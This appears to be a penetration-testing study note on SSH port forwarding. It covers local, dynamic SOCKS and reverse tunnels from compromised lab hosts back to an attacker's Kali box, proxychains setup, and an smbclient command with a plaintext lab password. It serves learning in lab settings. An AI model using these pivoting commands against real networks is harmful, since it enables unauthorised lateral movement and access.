---
tags:
  - tool
  - routing
---
# ssh

Connect to linux machines

## Capabilities

### Local Fowarding

```bash
# Connect to 10.4.50.215 and listen on 4455, forwarding to 172.16.50.217:445
ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215

# Connect to 10.4.50.215 and listen on 9999, forwarding all traffic (simulating a SOCKS proxy)
ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
```

### Remote Fowarding (reverse)

```bash
# Connect to our attack box, listen on port 2345, and forward all traffic to 10.4.50.215:5432
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@$OUR_IP

# Connect to our attack box, and act as a SOCKS proxy operating on port 1080
ssh -N -R 1080 kali@$OUR_IP
```

`-N` means no shell

- `-L` think local port forwarding
- `-D` think dynamic port forwarding (SOCKS proxy)
- `-R` think remote port forwarding

In the 2nd example

```bash
ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
```

We are running the `ssh` command on a reverse shell we have already established to `192.168.50.63`. Upon executing the command, `192.168.50.63` essentially becomes a SOCKS proxy for us to send traffic to that will then be forwarded to `10.4.50.215`, and `10.4.50.215` will forward the traffic to its final destination.

We can then use [proxychains](../../../15%20Routing/proxychains.md) to interact with `192.168.50.63` by adding the following to our `/etc/proxychains4.conf`

```bash
# ... At the very bottom of the file, we set the ProxyList to only point to port 9999.
[ProxyList]
socks5 192.168.50.63 9999
```

Now in the following command

```bash
proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
```

The request will first be taken by `proxychains` and fowarded to `192.168.50.63:9999` as specified in our `/etc/proxychains4.conf`. The traffic is then tunneled to `10.4.50.215:9999`, where `10.4.50.215` then fowards it to its final destination of `172.16.50.217:445`.